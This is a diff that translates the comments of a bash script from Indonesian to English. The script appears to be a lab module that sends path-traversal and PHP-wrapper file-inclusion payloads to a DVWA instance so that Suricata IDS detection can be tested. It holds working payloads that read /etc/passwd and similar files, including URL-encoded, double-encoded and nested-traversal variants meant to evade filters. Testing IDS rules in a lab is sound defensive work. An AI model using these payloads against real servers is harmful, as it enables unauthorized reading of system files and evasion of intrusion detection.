@@ -1,131 +1,131 @@
 #!/bin/bash
 
 # =================================================================
-# MODUL 06: PATH TRAVERSAL (FILE INCLUSION) - ROTASI PAYLOAD
-# Strategi: 3 Level Depth (Basic, Encoding, Wrapper/Filter)
-# Input: Menerima argumen $1 sebagai Nomor Ronde
+# MODULE 06: PATH TRAVERSAL (FILE INCLUSION) - PAYLOAD ROTATION
+# Strategy: 3 Level Depth (Basic, Encoding, Wrapper/Filter)
+# Input: Receives argument $1 as the Round Number
 # =================================================================
 
-# Menerima Input Nomor Ronde dari Daily Round
-ROUND=${1:-1} # Default ke ronde 1 jika kosong
+# Receive Input Round Number from Daily Round
+ROUND=${1:-1} # Default to round 1 if empty
 
-# KONFIGURASI
-TARGET_IP="192.168.x.x"   # Ganti dengan IP Metasploitable
-# Masukkan PHPSESSID valid dari browser
-COOKIE="security=low; PHPSESSID=ganti_dengan_session_id_anda"
+# CONFIGURATION
+TARGET_IP="192.168.x.x"   # Replace with your Metasploitable IP
+# Insert a valid PHPSESSID from the browser
+COOKIE="security=low; PHPSESSID=replace_with_your_session_id"
 LOG_FILE="logs/trav_session_$(date +%F).log"
 
-# URL Vulnerable di DVWA
+# Vulnerable DVWA URL
 BASE_URL="http://$TARGET_IP/dvwa/vulnerabilities/fi/?page="
 
-# Warna untuk Tampilan Laporan
+# Colors for Report Display
 YELLOW='\033[1;33m'
 CYAN='\033[0;36m'
 RED='\033[0;31m'
 NC='\033[0m' # No Color
 
 # =================================================================
-# LOGIKA ROTASI PAYLOAD (PAYLOAD DIVERSITY)
-# Mengubah Teknik Evasion (Level 2) & Target File (Level 3)
+# PAYLOAD ROTATION LOGIC (PAYLOAD DIVERSITY)
+# Changes the evasion technique (Level 2) and target file (Level 3)
 # =================================================================
 if [ "$ROUND" -le 10 ]; then
-    # --- SET A (Ronde 1-10) ---
+    # --- SET A (Round 1-10) ---
     # Level 2: Standard URL Encode
     # ../ -> ..%2f
     PAYLOAD_L2="..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
     DESC_L2="Evasion: URL Encoding (Standard)"
 
-    # Level 3: Wrapper Target Passwd
+    # Level 3: Wrapper target passwd
     FILE_L3="etc/passwd"
 
 elif [ "$ROUND" -le 20 ]; then
-    # --- SET B (Ronde 11-20) ---
+    # --- SET B (Round 11-20) ---
     # Level 2: Double URL Encode
-    # % -> %25, jadi %2f -> %252f
+    # % -> %25, so %2f -> %252f
     PAYLOAD_L2="%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
     DESC_L2="Evasion: Double URL Encoding"
 
-    # Level 3: Wrapper Target Group (Variasi file)
+    # Level 3: Wrapper target group (file variation)
     FILE_L3="etc/group"
 
 else
-    # --- SET C (Ronde 21-30) ---
+    # --- SET C (Round 21-30) ---
     # Level 2: Nested Traversal
-    # ....// -> Jadi ../ setelah difilter satu kali
+    # ....// -> becomes ../ after single filtering
     PAYLOAD_L2="....//....//....//....//....//etc/passwd"
     DESC_L2="Evasion: Nested Traversal (Filter Bypass)"
 
-    # Level 3: Wrapper Target Hosts (Variasi file)
+    # Level 3: Wrapper target hosts (file variation)
     FILE_L3="etc/hosts"
 fi
 
-echo "[+] [06_TRAV] Memulai Modul Path Traversal..."
+echo "[+] [06_TRAV] Starting Path Traversal Module..."
 echo "[+] Target Base URL: $BASE_URL"
-echo "[+] Mode: Ronde $ROUND ($DESC_L2)"
+echo "[+] Mode: Round $ROUND ($DESC_L2)"
 
-# Cek Cookie
-if [[ "$COOKIE" == *"ganti_dengan"* ]]; then
-   echo -e "${RED}[!] WARNING: Cookie belum di-set! Script akan gagal login DVWA.${NC}"
+# Check cookie
+if [[ "$COOKIE" == *"replace_with"* ]]; then
+   echo -e "${RED}[!] WARNING: Cookie not set yet! The script may fail to log in to DVWA.${NC}"
    sleep 3
 fi
 
 # -----------------------------------------------------------------
 # LEVEL 1: BASIC TRAVERSAL (NOISY - BASELINE)
-# Tujuan: Baseline. Menguji rule standar "../" (Dot Dot Slash).
-# Payload: ../../../../../etc/passwd (Tetap Sama)
+# Goal: Baseline. Test detection of the standard "../" traversal pattern.
+# Payload: ../../../../../etc/passwd (fixed)
 # -----------------------------------------------------------------
 echo -e "${CYAN}[Level 1] Running Basic Traversal (/etc/passwd)...${NC}"
 
 PAYLOAD="../../../../../etc/passwd"
 FULL_URL="${BASE_URL}${PAYLOAD}"
 
-# TAMPILKAN LAPORAN
+# DISPLAY REPORT
 echo -e "${YELLOW}    [Payload Path]   : $PAYLOAD${NC}"
 echo -e "${YELLOW}    [Full URL]       : $FULL_URL${NC}"
-echo -e "${YELLOW}    [Info Teknik]    : Mengakses file sensitif menggunakan path relative${NC}"
+echo -e "${YELLOW}    [Technique Info] : Accessing a sensitive file using a relative path${NC}"
 
-# Eksekusi
+# Execute
 curl -s -b "$COOKIE" "$FULL_URL" -o logs/trav_lvl1_r${ROUND}.txt
-echo "    -> Selesai. (Harapan: Alert ET WEB_SERVER /etc/passwd Access)"
+echo "    -> Completed. (Expected: ET WEB_SERVER /etc/passwd access alert)"
 sleep 5
 
 # -----------------------------------------------------------------
-# LEVEL 2: ENCODED TRAVERSAL (EVASION - DINAMIS)
-# Tujuan: Menguji kemampuan decoding URI Suricata.
-# Teknik: Menggunakan variabel payload dinamis ($PAYLOAD_L2).
+# LEVEL 2: ENCODED TRAVERSAL (EVASION - DYNAMIC)
+# Goal: Test Suricata's URI decoding capability.
+# Technique: Use the dynamic payload variable ($PAYLOAD_L2).
 # -----------------------------------------------------------------
 echo -e "${CYAN}[Level 2] Running $DESC_L2...${NC}"
 
-# Menggunakan variabel PAYLOAD_L2 yang berubah sesuai ronde
+# Use the PAYLOAD_L2 variable, which changes by round
 FULL_URL="${BASE_URL}${PAYLOAD_L2}"
 
-# TAMPILKAN LAPORAN
+# DISPLAY REPORT
 echo -e "${YELLOW}    [Payload Encoded]: $PAYLOAD_L2${NC}"
-echo -e "${YELLOW}    [Info Teknik]    : Menguji kemampuan decoding IDS${NC}"
+echo -e "${YELLOW}    [Technique Info] : Testing IDS decoding capability${NC}"
 
-# Eksekusi
+# Execute
 curl -s -b "$COOKIE" "$FULL_URL" -o logs/trav_lvl2_r${ROUND}.txt
-echo "    -> Selesai. (Harapan: Deteksi Evasion atau tetap terdeteksi sebagai LFI)"
+echo "    -> Completed. (Expected: Evasion detection or still flagged as LFI)"
 sleep 5
 
 # -----------------------------------------------------------------
-# LEVEL 3: PHP WRAPPER (LFI to RCE PREPARATION - DINAMIS)
-# Tujuan: Menguji deteksi protokol PHP (php://filter).
-# Teknik: Menggunakan 'php://filter' dengan target file bervariasi ($FILE_L3).
+# LEVEL 3: PHP WRAPPER (LFI to RCE PREPARATION - DYNAMIC)
+# Goal: Test detection of the PHP protocol (php://filter).
+# Technique: Use 'php://filter' with a varying target file ($FILE_L3).
 # -----------------------------------------------------------------
 echo -e "${CYAN}[Level 3] Running PHP Filter Wrapper (Target: $FILE_L3)...${NC}"
 
-# Payload PHP Wrapper, target file berubah sesuai ronde
+# PHP wrapper payload; target file varies by round
 PAYLOAD="php://filter/convert.base64-encode/resource=../../../../../$FILE_L3"
 FULL_URL="${BASE_URL}${PAYLOAD}"
 
-# TAMPILKAN LAPORAN
+# DISPLAY REPORT
 echo -e "${YELLOW}    [Payload Wrapper]: $PAYLOAD${NC}"
-echo -e "${YELLOW}    [Info Teknik]    : Menggunakan protokol php:// untuk membungkus file target${NC}"
+echo -e "${YELLOW}    [Technique Info] : Using the php:// protocol to wrap the target file${NC}"
 
-# Eksekusi
+# Execute
 curl -s -b "$COOKIE" "$FULL_URL" -o logs/trav_lvl3_r${ROUND}.txt
-echo "    -> Selesai. (Harapan: Alert ET WEB_SERVER PHP wrapper)"
+echo "    -> Completed. (Expected: ET WEB_SERVER PHP wrapper alert)"
 
-echo "[+] [06_TRAV] Modul Selesai pada $(date)"
+echo "[+] [06_TRAV] Module Finished at $(date)"
 echo "-----------------------------------------------------------"
